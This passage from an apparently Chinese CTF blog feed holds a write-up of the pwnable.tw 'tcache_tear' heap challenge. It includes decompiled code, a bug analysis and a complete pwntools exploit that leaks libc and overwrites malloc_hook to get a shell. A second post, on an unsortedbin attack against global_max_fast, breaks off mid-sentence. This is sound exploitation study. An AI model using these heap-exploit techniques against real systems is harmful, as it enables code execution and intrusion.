class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  sub_400948(a1, a2, a3);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name:&quot;</span>);</span><br><span class=\"line\">  read_name((__int64)&amp;name, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      menu();</span><br><span class=\"line\">      v3 = get_num();</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 != <span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v4 &lt;= <span class=\"number\">7</span> )                            <span class=\"comment\">// 限制释放次数</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(ptr);</span><br><span class=\"line\">        ++v4;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v3 &gt; <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">3</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        info();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">4</span> )</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">LABEL_14:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid choice&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v3 != <span class=\"number\">1</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_14;</span><br><span class=\"line\">      add();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>只允许 8 次 free，而且还有 tcache，ptr 指针存在 uaf，但是没有编辑函数，输出的是 name，对于 name 输入输出限制大小都在 0x20 没有溢出以及泄露 ptr 的可能。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> size; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size:&quot;</span>);</span><br><span class=\"line\">  v0 = get_num();</span><br><span class=\"line\">  size = v0;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v0 &lt;= <span class=\"number\">0xFF</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    ptr = <span class=\"built_in\">malloc</span>(v0);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data:&quot;</span>);</span><br><span class=\"line\">    read_name((__int64)ptr, size - <span class=\"number\">16</span>);         <span class=\"comment\">// 溢出</span></span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>add 读入数据时存在数字类型转换溢出，当 size&lt;16 时，读入非常大的数据，可以覆盖 topchunk</p>\n<h2 id=\"loading\"><a class=\"markdownIt-Anchor\" href=\"#loading\">#</a> loading:</h2>\n<p>1：最主要的问题，如何泄露 libc 的地址。尝试攻击 stdout 结构体</p>\n<p>largebin 不走 tcache，但是走 unsortedbin，所以伪造 fakechunk 进 sortedbin，低版本的 libc2.27 可以 tcache double free, 很容易拿到 name，并且实现超长数据写（size&lt;16)</p>\n<p>我们将 name 伪造成 largechunk，free 后进 unsortedbins，泄露 libc，然后同样手法修改 malloc_hook，这次需要 realloc 调栈</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp:</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.log_level=&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#r=process(&#x27;./tcache_tear&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;chall.pwnable.tw&#x27;</span>,<span class=\"number\">10207</span>)</span><br><span class=\"line\">elf =ELF(<span class=\"string\">&#x27;./tcache_tear&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class=\"line\">name=<span class=\"number\">0x602060</span></span><br><span class=\"line\"><span class=\"comment\">#fake chunksize 0x91,name size is 0x20</span></span><br><span class=\"line\"></span><br><span class=\"line\">gp = <span class=\"number\">0x602088</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ch</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Your choice :&quot;</span>,<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,text</span>):</span><br><span class=\"line\">\tch(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Size:&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\tr.sendlineafter(<span class=\"string\">&quot;Data:&quot;</span>,text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>():</span><br><span class=\"line\">\tch(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(r,&#x27;b malloc&#x27;)</span></span><br><span class=\"line\">offset = gp-name</span><br><span class=\"line\">fakechunk=p64(<span class=\"number\">0x602060</span>)+p64(<span class=\"number\">0x501</span>)</span><br><span class=\"line\">fakechunk +=<span class=\"string\">b&#x27;\\x00&#x27;</span>*(offset-<span class=\"number\">0x10</span>)+p64(name+<span class=\"number\">0x10</span>)+<span class=\"string\">b&#x27;\\x00&#x27;</span>*(<span class=\"number\">0x602560</span>-<span class=\"number\">0x602090</span>+<span class=\"number\">8</span>)+p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">fakechunk +=<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x18</span> + p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">r.sendafter(<span class=\"string\">&quot;Name:&quot;</span>,p64(<span class=\"number\">0x602060</span>))</span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">free()</span><br><span class=\"line\">free()</span><br><span class=\"line\">add(<span class=\"number\">10</span>,p64(name))</span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">10</span>,fakechunk)</span><br><span class=\"line\">free()</span><br><span class=\"line\">ch(<span class=\"number\">3</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&quot;\\x05&quot;</span>)</span><br><span class=\"line\">r.recv(<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">main_addr_96 = u64(r.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">malloc_hook = main_addr_96-<span class=\"number\">0x70</span></span><br><span class=\"line\">realloc_hook = malloc_hook-<span class=\"number\">0x8</span></span><br><span class=\"line\">libcbase = main_addr_96 - <span class=\"number\">0x3ebca0</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;libc : &quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;malloc_hook : &quot;</span>,<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\"></span><br><span class=\"line\">onegadget = <span class=\"number\">0xcafebabedeadbeef</span></span><br><span class=\"line\">onegadget = libcbase +<span class=\"number\">0x010a38c</span></span><br><span class=\"line\">realloc = libcbase + libc.sym[<span class=\"string\">&#x27;realloc&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;realloc _: &quot;</span>,<span class=\"built_in\">hex</span>(realloc))</span><br><span class=\"line\">add(<span class=\"number\">10</span>,p64(malloc_hook-<span class=\"number\">8</span>))</span><br><span class=\"line\">add(<span class=\"number\">10</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">10</span>,p64(onegadget)+p64(realloc+<span class=\"number\">6</span>))</span><br><span class=\"line\">ch(<span class=\"number\">1</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">&quot;10&quot;</span>)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/04/01/note-file/",
            "url": "http://example.com/2022/04/01/note-file/",
            "title": "note_file",
            "date_published": "2022-04-01T08:25:12.000Z",
            "content_html": "<h1 id=\"unsortedbin_attack-global_max_fast\"><a class=\"markdownIt-Anchor\" href=\"#unsortedbin_attack-global_max_fast\">#</a> unsortedbin_attack  global_max_fast</h1>\n<h2 id=\"保护\"><a class=\"markdownIt-Anchor\" href=\"#保护\">#</a> 保护</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ file note_five </span><br><span class=\"line\">note_five: ELF <span class=\"number\">64</span>-bit LSB shared object, x86<span class=\"number\">-64</span>, version <span class=\"number\">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class=\"number\">-64.</span>so<span class=\"number\">.2</span>, <span class=\"keyword\">for</span> GNU/Linux <span class=\"number\">2.6</span><span class=\"number\">.32</span>, BuildID[sha1]=<span class=\"number\">99</span>cce6e83f71ad3fa44410c59cd5a40b4ade1acb, stripped</span><br><span class=\"line\">giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ checksec --file=note_five</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/giantbranch/Desktop/ruan/attack_global_max_fast/note_five&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br><span class=\"line\">giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"主要程序\"><a class=\"markdownIt-Anchor\" href=\"#主要程序\">#</a> 主要程序：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">menu</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;infomation management:&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. new info&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. edit info&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3. delete info&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;4. exit&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;choice&gt;&gt; &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> get_num();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> *v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> size; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;idx: &quot;</span>);</span><br><span class=\"line\">  idx = get_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt;= <span class=\"number\">0</span> &amp;&amp; idx &lt;= <span class=\"number\">4</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">    size = get_num();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( size &gt; <span class=\"number\">0x8F</span> &amp;&amp; size &lt;= <span class=\"number\">0x400</span> )         <span class=\"comment\">// size &gt;fast_max_</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      heaplist[idx] = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">      v0 = sizeL;</span><br><span class=\"line\">      sizeL[idx] = size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;size error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;idx error&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">int</span>)v0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">sub_D47</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;idx: &quot;</span>);</span><br><span class=\"line\">  idx = get_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &lt; <span class=\"number\">0</span> || idx &gt; <span class=\"number\">4</span> || !heaplist[idx] )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;idx error&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;content: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"type\">read_t</span>(heaplist[idx], sizeL[idx], <span class=\"number\">10LL</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_A70</span><span class=\"params\">(__int64 ptr, <span class=\"type\">signed</span> <span class=\"type\">int</span> size, <span class=\"type\">char</span> a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int8 buf; <span class=\"comment\">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v7; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v7 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; ; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)i;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( i &gt; size )\t\t\t\t\t\t\t<span class=\"comment\">//offbyone</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">1uLL</span>) &lt;= <span class=\"number\">0</span> )        <span class=\"comment\">// connot input null</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;read error&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    result = buf;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( buf == a3 )                            <span class=\"comment\">// a3=&#x27;\\n&#x27;</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    *(_BYTE *)(ptr + i) = buf;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">sub_DF5</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> *v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;idx: &quot;</span>);</span><br><span class=\"line\">  idx = get_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt;= <span class=\"number\">0</span> &amp;&amp; idx &lt;= <span class=\"number\">4</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( heaplist[idx] )</span><br><span class=\"line\">      <span class=\"built_in\">free</span>((<span class=\"type\">void</span> *)heaplist[idx]);</span><br><span class=\"line\">    heaplist[idx] = <span class=\"number\">0LL</span>;                        <span class=\"comment\">// no uaf</span></span><br><span class=\"line\">    v0 = sizeL;</span><br><span class=\"line\">    sizeL[idx] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;idx error&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">int</span>)v0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>限制了堆块大小，没有输出函数泄露地址，没有 UAF。但 offbyone</p>\n<h2 id=\"思路unsortedbins-attack-攻击global_max_fast将堆块放入fastbins\"><a class=\"markdownIt-Anchor\" href=\"#思路unsortedbins-attack-攻击global_max_fast将堆块放入fastbins\">#</a> 思路：unsortedbins attack 攻击 global_max_fast，将堆块放入 fastbins.</h2>\n<h2 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理：</h2>\n<h2 id=\"unsorted-bin-概述\"><a class=\"markdownIt-Anchor\" href=\"#unsorted-bin-概述\">#</a> unsorted bin 概述</h2>\n<p>・当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中</p>\n<p>・释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</p>\n<p>・当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话</p>\n<p>・Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即<strong>插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong></p>\n<p>・在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220401163135175.png\" alt=\"image-20220401163135175\"></p>\n<p>如果我们控制了 bk 的值，我们就能将 unsorted_chunks (av) 写到 bk+0x10 地址，这是一个很大的值</p>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程：</h2>\n<p>1，构造 overlap，实现 freechunk 的覆盖</p>\n<p>2：修改 unsorted_chunk 的 bk,</p>\n<p>​\t\t<em>问题，pie 保护导致没有地址，没有输出但上述导致地址无法泄露，如何覆盖到 global_max_fast?</em></p>\n<p>​</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\"><span class=\"number\">0x56021208d000</span> PREV_INUSE &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">135169</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0x7fb7435a7b78</span> &lt;main_arena+<span class=\"number\">88</span>&gt;, </span><br><span class=\"line\">  bk = <span class=\"number\">0x7fb7435a7b78</span> &lt;main_arena+<span class=\"number\">88</span>&gt;, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pwndbg&gt; p &amp;global_max_fast</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"type\">size_t</span> *) <span class=\"number\">0x7fb7435a97f8</span> &lt;global_max_fast&gt;</span><br><span class=\"line\">pwndbg&gt; p &amp;main_arena</span><br><span class=\"line\">$<span class=\"number\">2</span> = (<span class=\"keyword\">struct</span> malloc_state *) <span class=\"number\">0x7fb7435a7b20</span> &lt;main_arena&gt;</span><br><span class=\"line\">pwndbg&gt; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最低三字节不会变，末尾第 4 字节不确定，但是偏移量不变，爆破</p>\n<p>・接着利用 fastbin attack 攻击 stdout-0x51 处，我们要攻击 stdout 结构体来泄露 libc 地址</p>\n<p>・stdout-0x51 处有一个错位的 0xff</p>\n<p>・泄露 libc 之后就用和 